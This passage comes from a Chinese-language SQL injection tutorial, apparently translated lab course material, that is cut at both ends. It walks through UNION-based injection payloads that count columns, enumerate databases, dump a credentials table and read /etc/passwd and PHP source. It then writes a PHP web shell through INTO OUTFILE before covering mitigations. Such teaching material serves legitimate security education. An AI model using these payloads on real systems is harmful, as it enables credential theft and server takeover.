ships;\n\n+----------+-----------+\n| Ship     | city      |\n+----------+-----------+\n| Morrison | New York  |\n+----------+-----------+\n1 rows in set (0.00 sec)\n```\n\n现在，让我们尝试使用`UNION`组合两个结果：\n\n```shell-session\nmysql> SELECT * FROM ports UNION SELECT * FROM ships;\n\n+----------+-----------+\n| code     | city      |\n+----------+-----------+\n| CN SHA   | Shanghai  |\n| SG SIN   | Singapore |\n| Morrison | New York  |\n| ZZ-21    | Shenzhen  |\n+----------+-----------+\n4 rows in set (0.00 sec)\n```\n\n如我们所见，`UNION`将两个语句的输出合并`SELECT`为一个，因此表中的条目`ports`和`ships`表中的条目合并为具有四行的单个输出。正如我们所看到的，一些行属于表，`ports`而另一些行属于`ships`表。\n\n注意：所有位置上所选列的数据类型应相同。\n\n------\n\n### 偶数列\n\n一条`UNION`语句只能对`SELECT`具有相同列数的语句进行操作。例如，如果我们尝试`UNION`两个具有不同列数的结果的查询，我们会收到以下错误：\n\n```shell-session\nmysql> SELECT city FROM ports UNION SELECT * FROM ships;\n\nERROR 1222 (21000): The used SELECT statements have a different number of columns\n```\n\n上面的查询导致错误，因为第一个`SELECT`返回一列而第二个`SELECT`返回两列。一旦我们有两个返回相同列数的查询，我们就可以使用`UNION`运算符从其他表和数据库中提取数据。\n\n例如，如果查询是：\n\n```sql\nSELECT * FROM products WHERE product_id = 'user_input'\n```\n\n我们可以`UNION`在输入中注入一个查询，以便返回另一个表中的行：\n\n```sql\nSELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '\n```\n\n假设表有两列，上述查询将返回`username`表`password`中的条目。`passwords``products`\n\n------\n\n### 非偶数列\n\n我们会发现原始查询的列数通常与我们要执行的 SQL 查询的列数不同，因此我们必须解决这个问题。例如，假设我们只有一列。在这种情况下，我们希望`SELECT`，我们可以为剩余的必需列放置垃圾数据，以便我们正在处理的列总数`UNION`与原始查询相同。\n\n例如，我们可以使用任何字符串作为垃圾数据，查询将返回该字符串作为该列的输出。如果我们`UNION`使用字符串`\"junk\"`，`SELECT`则查询`SELECT \"junk\" from passwords`将始终返回`junk`。我们也可以使用数字。例如，查询`SELECT 1 from passwords`将始终`1`作为输出返回。\n\n注意：在用垃圾数据填充其他列时，必须保证数据类型与该列的数据类型匹配，否则查询会返回错误。为了简单起见，我们将使用数字作为我们的垃圾数据，这对于跟踪我们的有效载荷位置也很方便，我们将在后面讨论。\n\n提示：对于高级 SQL 注入，我们可能只想使用 'NULL' 来填充其他列，因为 'NULL' 适合所有数据类型。\n\n`products`上面例子中的表有两列，所以我们必须有`UNION`两列。如果我们只想得到一列“eg `username`”，我们必须这样做`username, 2`，这样我们就有相同数量的列：\n\n```sql\nSELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords\n```\n\n如果我们在原始查询的表中有更多的列，我们必须添加更多的数字来创建剩余的所需列。例如，如果原始查询用于`SELECT`具有四列的表，我们的`UNION`注入将是：\n\n```sql\nUNION SELECT username, 2, 3, 4 from passwords-- '\n```\n\n此查询将返回：\n\n```shell-session\nmysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '\n\n+-----------+-----------+-----------+-----------+\n| product_1 | product_2 | product_3 | product_4 |\n+-----------+-----------+-----------+-----------+\n|   admin   |    2      |    3      |    4      |\n+-----------+-----------+-----------+-----------+\n```\n\n正如我们所见，我们想要的 ' `UNION SELECT username from passwords`' 查询输出位于第二行的第一列，而数字填充了其余列。\n\n## 0x08 Union Injection\n\n现在我们知道 Union 子句是如何工作的以及如何使用它让我们学习如何在我们的 SQL 注入中使用它。让我们来看下面的例子：\n\n![img](https://p.ipic.vip/5yfxhm.png)\n\n我们在搜索参数中看到了潜在的 SQL 注入。我们通过注入单引号 ( ) 来应用 SQLi Discovery 步骤`'`，但我们确实收到错误：\n\n![img](https://p.ipic.vip/pabe77.png)\n\n由于我们造成了错误，这可能意味着该页面容易受到 SQL 注入攻击。这种情况非常适合通过基于联合的注入进行利用，因为我们可以看到我们的查询结果。\n\n------\n\n### 检测列数\n\n在继续使用基于联合的查询之前，我们需要找到服务器选择的列数。有两种检测列数的方法：\n\n- 使用`ORDER BY`\n- 使用`UNION`\n\n##### 使用 ORDER BY\n\n检测列数的第一种方法是通过`ORDER BY`我们之前讨论过的函数。我们必须注入一个查询，该查询按我们指定的列对结果进行排序，“即第 1 列、第 2 列等等”，直到我们收到一个错误，指出指定的列不存在。\n\n例如，我们可以从 开始`order by 1`，按第一列排序，然后成功，因为表必须至少有一个列。然后我们会做`order by 2`，然后`order by 3`直到我们到达一个返回错误的数字，或者页面没有显示任何输出，这意味着这个列号不存在。我们成功排序的最终成功列为我们提供了列总数。\n\n如果我们在 处失败`order by 4`，这意味着该表有三列，这是我们能够成功排序的列数。让我们回到之前的示例并尝试使用以下有效负载进行相同的操作：\n\n```sql\n' order by 1-- -\n```\n\n提醒：我们在末尾添加了一个额外的破折号 (-)，以向您表明 (--) 之后有一个空格。\n\n如我们所见，我们得到了一个正常的结果：\n\n![img](https://p.ipic.vip/5yfxhm.png)\n\n接下来，让我们尝试使用以下有效负载按第二列排序：\n\n```sql\n' order by 2-- -\n```\n\n我们仍然得到结果。我们注意到它们的排序方式与预期的不同：\n\n![img](https://p.ipic.vip/eo1va8.jpg)\n\n`3`我们对 column和做同样的事情`4`并得到结果。但是，当我们尝试`ORDER BY`第 5 列时，出现以下错误：\n\n![img](https://p.ipic.vip/d109h9.jpg)\n\n这意味着该表恰好有 4 列。\n\n##### 使用 UNION\n\n另一种方法是尝试使用不同数量的列进行联合注入，直到我们成功取回结果。第一个方法总是返回结果，直到我们遇到错误，而这个方法总是给出错误，直到我们获得成功。我们可以从注入一个 3 列`UNION`查询开始：\n\n```sql\ncn' UNION select 1,2,3-- -\n```\n\n我们收到一条错误消息，指出列数不匹配：  \n\n![img](https://p.ipic.vip/65slq5.png)\n\n因此，让我们尝试四列并查看响应：\n\n```sql\ncn' UNION select 1,2,3,4-- -\n```\n\n![img](https://p.ipic.vip/sz9ia5.png)\n\n这次我们成功得到了结果，这意味着该表再次具有 4 列。我们可以使用任何一种方法来确定列数。一旦我们知道了列数，我们就知道如何形成我们的有效载荷，我们可以继续下一步。\n\n------\n\n### 注射位置\n\n虽然查询可能返回多列，但 Web 应用程序可能只显示其中的一部分。因此，如果我们将查询注入到页面上未打印的列中，我们将无法获得其输出。这就是为什么我们需要确定将哪些列打印到页面，以确定在何处放置我们的注入。在前面的示例中，虽然注入的查询返回 1、2、3 和 4，但我们在页面上只看到 2、3 和 4 作为输出数据返回给我们：\n\n![img](https://p.ipic.vip/sz9ia5.png)\n\n并非每一列都会显示给用户是很常见的。例如，ID 字段通常用于将不同的表链接在一起，但用户不需要看到它。这告诉我们打印了第 2 列、第 3 列和第 4 列以将我们的注入放置在其中任何一个中。`We cannot place our injection at the beginning, or its output will not be printed.`\n\n这是使用数字作为我们的垃圾数据的好处，因为它可以很容易地跟踪打印了哪些列，因此我们知道在哪一列放置我们的查询。为了测试我们是否可以从数据库中获取“而不仅仅是数字”的实际数据，我们可以使用`@@version`SQL 查询作为测试并将其放在第二列而不是数字 2 中：\n\n```sql\ncn' UNION select 1,@@version,3,4-- -\n```\n\n![img](https://p.ipic.vip/egjoic.jpg)\n\n如我们所见，我们可以获得显示的数据库版本。现在我们知道如何形成我们的 Union SQL 注入有效负载，以成功地获得打印在页面上的查询输出。在下一节中，我们将讨论如何枚举数据库并从其他表和数据库中获取数据。\n\n## 0x09 数据库枚举\n\n在前面的部分中，我们了解了不同的 SQL 查询`MySQL`和 SQL 注入以及如何使用它们。本节将使用所有这些，并在 SQL 注入中使用 SQL 查询从数据库中收集数据。\n\n------\n\n### MySQL指纹识别\n\n在枚举数据库之前，我们通常需要确定我们正在处理的 DBMS 类型。这是因为每个 DBMS 都有不同的查询，知道它是什么将帮助我们知道使用什么查询。\n\n作为初步猜测，如果我们在 HTTP 响应中看到的 Web 服务器是`Apache`或`Nginx`，则可以很好地猜测该 Web 服务器正在 Linux 上运行，因此 DBMS 很可能是`MySQL`。如果网络服务器是，这同样也适用于 Microsoft DBMS `IIS`，所以它很可能是`MSSQL`。然而，这是一个牵强附会的猜测，因为许多其他数据库可以在操作系统或 Web 服务器上使用。因此，我们可以测试不同的查询来识别我们正在处理的数据库类型。\n\n正如我们`MySQL`在本模块中介绍的那样，让我们使用指纹`MySQL`数据库。以下查询及其输出将告诉我们我们正在处理`MySQL`：\n\n| 有效载荷           | 何时使用                 | 预期产出                                | 输出错误                                         |\n| ------------------ | ------------------------ | --------------------------------------- | ------------------------------------------------ |\n| `SELECT @@version` | 当我们有完整的查询输出时 | MySQL版本'即`10.3.22-MariaDB-1ubuntu1`' | 在 MSSQL 中，它返回 MSSQL 版本。其他 DBMS 出错。 |\n| `SELECT POW(1,1)`  | 当我们只有数字输出时     | `1`                                     | 其他 DBMS 出错                                   |\n| `SELECT SLEEP(5)`  | 盲/无输出                | 延迟页面响应 5 秒并返回`0`。            | 不会延迟与其他 DBMS 的响应                       |\n\n正如我们在上一节的示例中看到的，当我们尝试时`@@version`，它给了我们：\n\n![img](https://p.ipic.vip/vejupm.jpg)\n\n输出`10.3.22-MariaDB-1ubuntu1`意味着我们正在处理`MariaDB`类似于 MySQL 的 DBMS。由于我们有直接的查询输出，因此我们不必测试其他有效载荷。相反，我们可以测试它们，看看我们得到了什么。\n\n------\n\n### INFORMATION_SCHEMA 数据库\n\n要使用从表中提取数据`UNION SELECT`，我们需要正确地形成我们的`SELECT`查询。为此，我们需要以下信息：\n\n- 数据库列表\n- 每个数据库中的表列表\n- 每个表中的列列表\n\n有了以上信息，我们就可以形成我们的`SELECT`语句，从 DBMS 内的任何数据库中的任何表中的任何列中转储数据。这是我们可以使用`INFORMATION_SCHEMA`数据库的地方。\n\nINFORMATION_SCHEMA数据库包含有关服务器上存在[的](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html)数据库和表的元数据。该数据库在利用 SQL 注入漏洞时起着至关重要的作用。由于这是一个不同的数据库，我们不能直接用语句调用它的表`SELECT`。如果我们只为语句指定一个表的名称`SELECT`，它将在同一数据库中查找表。\n\n因此，要引用另一个数据库中存在的表，我们可以使用点 ' `.`' 运算符。例如，对于名为 的数据库中存在的`SELECT`表，我们可以使用：`users``my_database`\n\n```sql\nSELECT * FROM my_database.users;\n```\n\n同样，我们可以查看`INFORMATION_SCHEMA`数据库中存在的表。\n\n------\n\n### 图式\n\n要开始我们的枚举，我们应该找到 DBMS 上可用的数据库。数据库中的表[SCHEMATA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html)`INFORMATION_SCHEMA`包含有关服务器上所有数据库的信息。它用于获取数据库名称，以便我们可以查询它们。该`SCHEMA_NAME`列包含当前存在的所有数据库名称。\n\n让我们先在本地数据库上测试一下，看看查询是如何使用的：\n\n```shell-session\nmysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;\n\n+--------------------+\n| SCHEMA_NAME        |\n+--------------------+\n| mysql              |\n| information_schema |\n| performance_schema |\n| ilfreight          |\n| dev                |\n+--------------------+\n6 rows in set (0.01 sec)\n```\n\n我们看到了`ilfreight`和`dev`数据库。\n\n注意：前三个数据库是默认的 MySQL 数据库，并且存在于任何服务器上，因此我们通常在数据库枚举时忽略它们。有时还有第四个“系统”数据库。\n\n现在，让我们使用`UNION`SQL 注入来执行相同的操作，并使用以下有效负载：\n\n```sql\ncn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -\n```\n\n![img](https://p.ipic.vip/tsychv.png)\n\n除了默认数据库之外，我们再次看到两个数据库，`ilfreight`和。`dev`让我们找出 Web 应用程序正在运行的数据库以从中检索端口数据。我们可以通过查询找到当前数据库`SELECT database()`。我们可以像在上一节中查找 DBMS 版本的方式一样执行此操作：\n\n```sql\ncn' UNION select 1,database(),2,3-- -\n```\n\n![img](https://p.ipic.vip/4zwupa.jpg)\n\n我们看到数据库名称是`ilfreight`. 然而，另一个数据库 ( `dev`) 看起来很有趣。因此，让我们尝试从中检索表格。\n\n------\n\n### 桌子\n\n在我们从数据库中转储数据之前`dev`，我们需要获取表的列表以使用`SELECT`语句查询它们。要查找数据库中的所有表，我们可以使用数据库`TABLES`中的表`INFORMATION_SCHEMA`。\n\n[TABLES](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html)表包含有关整个数据库中所有表的信息。该表包含多个列，但我们对`TABLE_SCHEMA`和`TABLE_NAME`列感兴趣。列`TABLE_NAME`存储表名，而`TABLE_SCHEMA`列指向每个表所属的数据库。这可以类似于我们找到数据库名称的方式来完成。例如，我们可以使用以下有效负载来查找`dev`数据库中的表：\n\n```sql\ncn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -\n```\n\n请注意我们如何用“TABLE_NAME”和“TABLE_SCHEMA”替换数字“2”和“3”，以获取同一查询中两列的输出。\n\n![img](https://p.ipic.vip/h240uh.png)\n\n注意：我们添加了一个 (where table_schema='dev') 条件来只返回来自 'dev' 数据库的表，否则我们会得到所有数据库中的所有表，这可能有很多。\n\n我们在 dev 数据库中看到四个表，即`credentials`、`framework`、`pages`和`posts`。例如，该`credentials`表可能包含要查看的敏感信息。\n\n------\n\n### 列\n\n要转储表的数据`credentials`，首先要找到表中的列名，可以在数据库`COLUMNS`中的表中找到`INFORMATION_SCHEMA`。COLUMNS表包含有关所有数据库中存在的所有列的信息[。](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html)这有助于我们找到查询表的列名。、和列可用于实现此目的`COLUMN_NAME`。正如我们之前所做的那样，让我们尝试使用此有效负载来查找表中的列名：`TABLE_NAME``TABLE_SCHEMA``credentials`\n\n```sql\ncn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -  \n```\n\n![img](https://p.ipic.vip/i7lof8.jpg)\n\n该表有两列，名为`username`和`password`。我们可以使用此信息并从表中转储数据。\n\n------\n\n### 数据\n\n现在我们有了所有的信息，我们可以形成我们的查询来从数据库中的表中`UNION`转储`username`和`password`列的数据。我们可以用and代替第 2 列和第 3 列：`credentials``dev``username``password`\n\n```sql\ncn' UNION select 1, username, password, 4 from dev.credentials-- -\n```\n\n请记住：不要忘记使用点运算符来引用“开发”数据库中的“凭据”，因为我们在“ilfreight”数据库中运行，如前所述。\n\n![img](https://p.ipic.vip/n9oypj.png)\n\n我们能够获取`credentials`表中的所有条目，其中包含密码哈希和 API 密钥等敏感信息。\n\n## 0x10 读取文件\n\n除了从 DBMS 中的各种表和数据库中收集数据外，SQL 注入还可以用于执行许多其他操作，例如在服务器上读取和写入文件，甚至在后端服务器上获得远程代码执行。\n\n------\n\n### 特权\n\n读取数据比写入数据更为常见，在现代 DBMS 中，写入数据严格保留给特权用户使用，因为它会导致系统利用，正如我们将看到的那样。例如，在 中`MySQL`，DB 用户必须有权`FILE`将文件的内容加载到表中，然后从该表中转储数据并读取文件。因此，让我们从收集有关我们在数据库中的用户权限的数据开始，以决定我们是否将文件读取和/或写入后端服务器。\n\n##### 数据库用户\n\n首先，我们必须确定我们在数据库中是哪个用户。虽然我们不一定需要数据库管理员 (DBA) 权限来读取数据，但在现代 DBMS 中这变得越来越需要，因为只有 DBA 才被授予此类权限。这同样适用于其他常见的数据库。如果我们确实拥有 DBA 权限，那么我们更有可能拥有文件读取权限。如果我们不这样做，那么我们必须检查我们的特权，看看我们能做什么。为了能够找到我们当前的数据库用户，我们可以使用以下任何查询：\n\n```sql\nSELECT USER()\nSELECT CURRENT_USER()\nSELECT user from mysql.user\n```\n\n我们的`UNION`注入有效载荷如下：\n\n```sql\ncn' UNION SELECT 1, user(), 3, 4-- -\n```\n\n或者：\n\n```sql\ncn' UNION SELECT 1, user, 3, 4 from mysql.user-- -\n```\n\n这告诉我们我们当前的用户，在这种情况下是`root`：\n\n![img](https://p.ipic.vip/mt3xp0.jpg)\n\n这是非常有前途的，因为根用户很可能是 DBA，这给了我们很多特权。\n\n##### 用户权限\n\n现在我们知道了我们的用户，我们可以开始寻找我们对那个用户有什么特权。首先，我们可以通过以下查询来测试我们是否拥有超级管理员权限：\n\n```sql\nSELECT super_priv FROM mysql.user\n```\n\n再一次，我们可以在上述查询中使用以下有效负载：\n\n```sql\ncn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -\n```\n\n如果我们在 DBMS 中有很多用户，我们可以添加`WHERE user=\"root\"`只显示当前用户的权限`root`：\n\n```sql\ncn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=\"root\"-- -  \n```\n\n![img](https://p.ipic.vip/d6y0ff.jpg)\n\n查询返回`Y`，这意味着`YES`，表示超级用户权限。我们还可以使用以下查询直接从模式中转储我们拥有的其他特权：\n\n```sql\ncn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -\n```\n\n再一次，我们可以添加`WHERE user=\"root\"`以仅显示我们当前的用户`root`权限。我们的有效载荷将是：\n\n```sql\ncn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE user=\"root\"-- -\n```\n\n我们看到了所有可能赋予我们当前用户的权限：\n\n![img](https://p.ipic.vip/yv5vct.jpg)\n\n我们看到`FILE`为我们的用户列出了权限，使我们能够读取文件甚至可能写入文件。因此，我们可以继续尝试读取文件。\n\n------\n\n### 加载文件\n\n现在我们知道我们有足够的权限来读取本地系统文件，让我们使用函数来做到这一点`LOAD_FILE()`。LOAD_FILE [()](https://mariadb.com/kb/en/load_file/)函数可用于 MariaDB / MySQL 从文件中读取数据。该函数只接受一个参数，即文件名。以下查询是如何读取文件的示例`/etc/passwd`：\n\n```sql\nSELECT LOAD_FILE('/etc/passwd');\n```\n\n注意：如果运行 MySQL 的 OS 用户有足够的权限读取文件，我们将只能读取该文件。\n\n类似于我们一直使用`UNION`注入的方式，我们可以使用上面的查询：\n\n```sql\ncn' UNION SELECT 1, LOAD_FILE(\"/etc/passwd\"), 3, 4-- -\n```\n\n![img](https://p.ipic.vip/pukwyf.png)\n\n我们能够通过SQL注入成功读取到passwd文件的内容。不幸的是，这也可能被用来泄露应用程序源代码。\n\n------\n\n### 另一个例子\n\n我们知道当前页面是`search.php`。默认的 Apache webroot 是`/var/www/html`. 让我们尝试阅读文件的源代码`/var/www/html/search.php`。\n\n```sql\ncn' UNION SELECT 1, LOAD_FILE(\"/var/www/html/search.php\"), 3, 4-- -\n```\n\n![img](https://p.ipic.vip/1alxqy.png)\n\n但是，该页面最终会在浏览器中呈现 HTML 代码。可以通过点击查看 HTML 源代码`[Ctrl + U]`。\n\n![加载文件源](https://p.ipic.vip/e0u51d.png)\n\n源代码向我们展示了完整的 PHP 代码，可以对其进行进一步检查以查找敏感信息（如数据库连接凭据）或查找更多漏洞。\n\n## 0x11 写入文件\n\n当涉及到将文件写入后端服务器时，它在现代 DBMS 中变得更加受限，因为我们可以利用它在远程服务器上编写一个 web shell，从而执行代码并接管服务器。这就是现代 DBMS 默认禁用文件写入并要求 DBA 具有某些权限才能写入文件的原因。在写文件之前，我们首先要检查自己是否有足够的权限，DBMS是否允许写文件。\n\n------\n\n### 写文件权限\n\n为了能够使用 MySQL 数据库将文件写入后端服务器，我们需要三件事：\n\n1. `FILE`启用权限的用户\n2. `secure_file_priv`未启用MySQL 全局变量\n3. 对后端服务器上我们要写入的位置的写入权限\n\n我们已经发现我们的当前用户具有`FILE`写入文件所需的权限。我们现在必须检查 MySQL 数据库是否具有该权限。这可以通过检查全局变量来完成`secure_file_priv`。\n\n##### secure_file_priv\n\n[secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv)变量用于确定从何处读取/写入文件。一个空值可以让我们从整个文件系统中读取文件。否则，如果设置了某个目录，我们只能从变量指定的文件夹中读取。另一方面，`NULL`意味着我们不能从任何目录读/写。MariaDB 将此变量默认设置为空，如果用户有权限，这允许我们读/写任何文件`FILE`。但是，`MySQL`用作`/var/lib/mysql-files`默认文件夹。这意味着`MySQL`使用默认设置无法通过注入读取文件。更糟糕的是，一些现代配置默认为`NULL`，这意味着我们无法在系统内的任何地方读取/写入文件。\n\n那么，让我们看看如何找出 的值`secure_file_priv`。在 中`MySQL`，我们可以使用以下查询来获取此变量的值：\n\n```sql\nSHOW VARIABLES LIKE 'secure_file_priv';\n```\n\n但是，由于我们正在使用`UNION`注入，因此我们必须使用语句来获取值`SELECT`。这应该不是问题，因为所有变量和大多数配置都存储在`INFORMATION_SCHEMA`数据库中。`MySQL`全局变量存储在一个名为[global_variables 的](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html)表中，根据文档，该表有两列`variable_name`和`variable_value`。\n\n我们必须从`INFORMATION_SCHEMA`数据库中的那个表中选择这两列。MySQL 配置中有数百个全局变量，我们不想检索所有这些变量。`secure_file_priv`然后，我们将使用`WHERE`我们在上一节中学到的子句过滤结果以仅显示变量。\n\n最终的 SQL 查询如下：\n\n```sql\nSELECT variable_name, variable_value FROM information_schema.global_variables where variable_name=\"secure_file_priv\"\n```\n\n因此，与其他注入查询类似`UNION`，我们可以使用以下 payload 获得上述查询结果。请记住再添加两列`1`&`4`作为垃圾数据，总共有 4 列'：\n\n```sql\ncn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=\"secure_file_priv\"-- -\n```\n\n![img](https://p.ipic.vip/h557d4.jpg)\n\n结果显示该`secure_file_priv`值为空，这意味着我们可以将文件读/写到任何位置。\n\n------\n\n### 选择进入 OUTFILE\n\n现在我们已经确认我们的用户应该将文件写入后端服务器，让我们尝试使用语句来做到这一点`SELECT .. INTO OUTFILE`。SELECT [INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/)语句可用于将来自选择查询的数据写入文件。这通常用于从表中导出数据。\n\n要使用它，我们可以`INTO OUTFILE '...'`在查询之后添加以将结果导出到我们指定的文件中。下面的示例将表的输出保存`users`到文件中`/tmp/credentials`：\n\n secure_file_priv\n\n```shell-session\nSELECT * from users INTO OUTFILE '/tmp/credentials';\n```\n\n如果我们转到后端服务器和`cat`文件，我们会看到该表的内容：\n\n secure_file_priv\n\n```shell-session\nsl1aun@htb[/htb]$ cat /tmp/credentials \n\n1       admin   392037dbba51f692776d6cefb6dd546d\n2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f\n```\n\n也可以直接将`SELECT`字符串写入文件，让我们可以向后端服务器写入任意文件。\n\n```sql\nSELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';\n```\n\n当我们`cat`打开文件时，我们会看到该文本：\n\n secure_file_priv\n\n```shell-session\nsl1aun@htb[/htb]$ cat /tmp/test.txt \n\nthis is a test\n```\n\n secure_file_priv\n\n```shell-session\nsl1aun@htb[/htb]$ ls -la /tmp/test.txt \n\n-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt\n```\n\n正如我们在上面看到的，该`test.txt`文件已成功创建并归`mysql`用户所有。\n\n提示：高级文件导出利用“FROM_BASE64(\"base64_data\")”函数，以便能够写入长文件/高级文件，包括二进制数据。\n\n------\n\n### 通过 SQL 注入写入文件\n\n让我们尝试向 webroot 写入一个文本文件并验证我们是否具有写入权限。下面的查询应该写入`file written successfully!`文件`/var/www/html/proof.txt`，然后我们可以在 Web 应用程序上访问该文件：\n\n```sql\nselect 'file written successfully!' into outfile '/var/www/html/proof.txt'\n```\n\n**注意：**要编写 web shell，我们必须知道 web 服务器的基本 web 目录（即 web root）。找到它的一种方法是使用`load_file`读取服务器配置，例如在 找到 Apache 的配置`/etc/apache2/apache2.conf`，在 找到 Nginx 的配置`/etc/nginx/nginx.conf`，或者在 找到 IIS 配置`%WinDir%\\System32\\Inetsrv\\Config\\ApplicationHost.config`，或者我们可以在线搜索其他可能的配置位置。此外，我们可能会运行模糊扫描并尝试将文件写入不同的可能的 Web 根目录，使用[这个 Linux 的词表](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)或[这个 Windows 的词表](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)。最后，如果以上方法都不起作用，我们可以使用显示给我们的服务器错误并尝试以这种方式找到 web 目录。\n\n注入`UNION`有效载荷如下：\n\n```sql\ncn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -\n```\n\n![img](https://p.ipic.vip/hkrsmg.png)\n\n我们在页面上没有看到任何错误，这表明查询成功了。`proof.txt`检查webroot 中的文件，我们看到它确实存在：\n\n![img](https://p.ipic.vip/40z8r3.png)\n\n注意：我们看到我们转储的字符串以及前面的“1”、“3”和后面的“4”。这是因为整个“UNION”查询结果都写入了文件。为了使输出更清晰，我们可以使用 \"\" 而不是数字。\n\n------\n\n### 编写网络外壳\n\n确认写入权限后，我们可以继续将 PHP web shell 写入 webroot 文件夹。我们可以编写如下的PHP webshell来直接在后台服务器上执行命令：\n\n```php\n<?php system($_REQUEST[0]); ?>\n```\n\n我们可以重用我们之前的`UNION`注入载荷，并将字符串更改为上面的字符串，并将文件名更改为`shell.php`：\n\n```sql\ncn' union select \"\",'<?php system($_REQUEST[0]); ?>', \"\", \"\" into outfile '/var/www/html/shell.php'-- -\n```\n\n  ', “ “, “ “ 进入输出文件 '/var/www/html/shell.php'-- -'>\n\n![img](https://p.ipic.vip/ur051n.png)\n\n再一次，我们没有看到任何错误，这意味着文件写入可能有效。`/shell.php`这可以通过浏览到文件并通过参数执行命令来验证`0`，`?0=id`在我们的 URL 中：\n\n![img](https://p.ipic.vip/2kzupt.png)\n\n该`id`命令的输出确认我们执行了代码并以用户身份运行`www-data`。\n\n## 0x12 缓解 SQL 注入\n\n------\n\n我们已经了解了 SQL 注入、它们发生的原因以及我们如何利用它们。我们还应该学习如何在我们的代码中避免这些类型的漏洞，并在发现它们时对其进行修补。让我们看一些如何缓解 SQL 注入的示例。\n\n------\n\n### 输入消毒\n\n这是我们之前讨论的身份验证绕过部分的代码片段：\n\n```php\n<SNIP>\n  $username = $_POST['username'];\n  $password = $_POST['password'];\n\n  $query = \"SELECT * FROM logins WHERE username='\". $username. \"' AND password = '\" . $password . \"';\" ;\n  echo \"Executing query: \" . $query . \"<br /><br />\";\n\n  if (!mysqli_query($conn ,$query))\n  {\n          die('Error: ' . mysqli_error($conn));\n  }\n\n  $result = mysqli_query($conn, $query);\n  $row = mysqli_fetch_array($result);\n<SNIP>\n```\n\n正如我们所看到的，脚本从 POST 请求中获取 和 并将其直接传递给查询`username`。`password`这将使攻击者可以注入他们想要的任何东西并利用该应用程序。可以通过清理任何用户输入来避免注入，使注入的查询无用。库提供了多种函数来实现这一点，一个这样的例子是[mysqli_real_escape_string()](https://www.php.net/manual/en/mysqli.real-escape-string.php)函数。此函数对诸如`'`and之类的字符进行转义`\"`，因此它们没有任何特殊含义。\n\n```php\n<SNIP>\n$username = mysqli_real_escape_string($conn, $_POST['username']);\n$password = mysqli_real_escape_string($conn, $_POST['password']);\n\n$query = \"SELECT * FROM logins WHERE username='\". $username. \"' AND password = '\" . $password . \"';\" ;\necho \"Executing query: \" . $query . \"<br /><br />\";\n<SNIP>\n```\n\n上面的代码片段显示了如何使用该函数。\n\n![mysqli_escape](https://p.ipic.vip/chzyde.png)\n\n正如预期的那样，由于转义了单引号，注入不再有效。一个类似的例子是用于转义 PostgreSQL 查询的[pg_escape_string() 。](https://www.php.net/manual/en/function.pg-escape-string.php)\n\n------\n\n### 输入验证\n\n还可以根据用于查询的数据验证用户输入，以确保它与预期输入相匹配。例如，当将电子邮件作为输入时，我们可以验证输入的形式是`...@email.com`，等等。\n\n考虑端口页面中的以下代码片段，我们`UNION`在其中使用了注入：\n\n```php\n<?php\nif (isset($_GET[\"port_code\"])) {\n\t$q = \"Select * from ports where port_code ilike '%\" . $_GET[\"port_code\"] . \"%'\";\n\t$result = pg_query($conn,$q);\n    \n\tif (!$result)\n\t{\n   \t\tdie(\"</table></div><p style='font-size: 15px;'>\" . pg_last_error($conn). \"</p>\");\n\t}\n<SNIP>\n?>\n```\n\n`port_code`我们看到直接在查询中使用了GET 参数。众所周知，端口号仅由字母或空格组成。我们可以将用户输入限制为仅这些字符，这将防止注入查询。正则表达式可用于验证输入：\n\n```php\n<SNIP>\n$pattern = \"/^[A-Za-z\\s]+$/\";\n$code = $_GET[\"port_code\"];\n\nif(!preg_match($pattern, $code)) {\n  die(\"</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>\");\n}\n\n$q = \"Select * from ports where port_code ilike '%\" . $code . \"%'\";\n<SNIP>\n```\n\n代码被修改为使用[preg_match()](https://www.php.net/manual/en/function.preg-match.php)函数，该函数检查输入是否与给定模式匹配。使用的模式是`[A-Za-z\\s]+`，它将只匹配包含字母和空格的字符串。任何其他字符都将导致脚本终止。\n\n![img](https://p.ipic.vip/xgrdd8.png)\n\n我们可以测试下面的注入：\n\n```sql\n'; SELECT 1,2,3,4-- -\n```\n\n![img](https://p.ipic.vip/xgrdd8.png)\n\n如上图所示，注入查询的输入被服务器拒绝。\n\n------\n\n### 用户权限\n\n正如最初讨论的那样，DBMS 软件允许创建具有细粒度权限的用户。我们应该确保查询数据库的用户只有最小权限。\n\n超级用户和具有管理权限的用户永远不应该与 Web 应用程序一起使用。这些帐户可以访问可能导致服务器受损的功能和特性。\n\n```shell-session\nMariaDB [(none)]> CREATE USER 'reader'@'localhost';\n\nQuery OK, 0 rows affected (0.002 sec)\n\n\nMariaDB [(none)]> GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';\n\nQuery OK, 0 rows affected (0.000 sec)\n```\n\n上面的命令添加了一个名为 who 的新 